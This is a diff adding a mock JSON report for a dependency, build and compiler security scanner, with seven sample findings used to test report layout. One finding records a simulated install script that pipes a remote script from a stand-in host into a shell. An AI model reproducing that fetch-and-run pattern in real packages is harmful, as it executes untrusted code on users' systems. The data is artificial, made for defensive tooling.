@@ -1,0 +1,21 @@
+{
+  "scan_id": "mock-1",
+  "generated_at": "2026-10-31T12:00:00Z",
+  "overall_summary": "MOCK DATA. Seven example categories are shown to check the report layout. No real scan was run.",
+  "summary_counts": {},
+  "module_status": { "dependency": "ok", "build": "ok", "compiler": "ok" },
+  "limitations": [
+    "OSV lists known records and may not cover every issue.",
+    "Matching hashes show two files are identical, not that the software is trustworthy.",
+    "Compiler differences are a signal for review, not proof of compromise."
+  ],
+  "items": [
+    { "id":"F-001", "module":"dependency", "category":"KNOWN_VULNERABILITY", "severity":"HIGH", "confidence":"CONFIRMED", "subject":{"ecosystem":"npm","name":"lodash","version":"4.17.20"}, "title":"lodash 4.17.20 has a published advisory", "file_hint":"package.json", "evidence":[{"type":"osv_advisory","data":{"id":"GHSA-MOCK-0001","fixed_in":["4.17.21"]}}], "explanation":{"plain_explanation":"OSV lists an advisory for this exact version.","why_it_matters":"Affected versions may be exploitable depending on how the code is used.","recommended_actions":["Upgrade to the fixed version listed by the advisory."],"limitations":"OSV only lists known issues."}, "explanation_source":"template" },
+    { "id":"F-002", "module":"dependency", "category":"KNOWN_MALICIOUS_ADVISORY", "severity":"CRITICAL", "confidence":"CONFIRMED", "subject":{"ecosystem":"npm","name":"mock-advisory","version":"1.0.0"}, "title":"Mock advisory category example", "evidence":[{"type":"osv_advisory","data":{"id":"MAL-MOCK-0001","simulation":true}}], "explanation":{"plain_explanation":"Mock record used only to exercise category styling."}, "explanation_source":"template" },
+    { "id":"F-003", "module":"dependency", "category":"SUSPICIOUS_INDICATOR", "severity":"HIGH", "confidence":"HIGH", "subject":{"ecosystem":"npm","name":"lodahs-demo","version":"1.0.0"}, "title":"Several package indicators need review", "file_hint":"package.json", "evidence":[{"type":"rule_hit","rule_id":"INSTALL_SCRIPT","data":{"script":"curl http://example.invalid/run.sh | sh","simulation":true}}], "explanation":{"plain_explanation":"The local simulation combines a lookalike name with an install script.","why_it_matters":"Review the package source before adding it to a project.","recommended_actions":["Inspect the package and its install behavior."],"limitations":"These signals do not confirm intent."}, "explanation_source":"template" },
+    { "id":"F-004", "module":"build", "category":"BUILD_MISMATCH", "severity":"HIGH", "confidence":"CONFIRMED", "subject":{"name":"dist/app"}, "title":"The distributed file differs from the trusted build", "evidence":[{"type":"hash_pair","data":{"trusted_sha256":"abc123","distributed_sha256":"def456","simulation":true}}], "explanation":{"plain_explanation":"The file hashes differ. The cause is not determined."}, "explanation_source":"template" },
+    { "id":"F-005", "module":"compiler", "category":"COMPILER_ANOMALY", "severity":"MEDIUM", "confidence":"HIGH", "subject":{"name":"__bg_hidden_telemetry"}, "title":"Binary contains a function absent from source", "evidence":[{"type":"symbol_diff","data":{"symbol":"__bg_hidden_telemetry","simulation":true}}], "explanation":{"plain_explanation":"The team-built wrapper simulation adds a fixed function to the binary."}, "explanation_source":"template" },
+    { "id":"F-006", "module":"dependency", "category":"UNRESOLVED", "severity":"UNKNOWN", "confidence":"LOW", "subject":{"name":"sample-package"}, "title":"Dependency check did not complete", "evidence":[{"type":"tool_output","data":{"code":"NETWORK_ERROR"}}], "explanation":{"plain_explanation":"The advisory service did not respond for this check."}, "explanation_source":"template" },
+    { "id":"F-007", "module":"dependency", "category":"NO_KNOWN_ISSUES", "severity":"INFO", "confidence":"HIGH", "subject":{"name":"workspace"}, "title":"No known issues were detected by the checks performed", "evidence":[{"type":"checks_performed","data":{"checks":["manifest scan","advisory lookup"]}}], "explanation":{"plain_explanation":"No known issues were detected by the checks performed.","limitations":"This says nothing about issues outside the checks performed."}, "explanation_source":"template" }
+  ]
+}
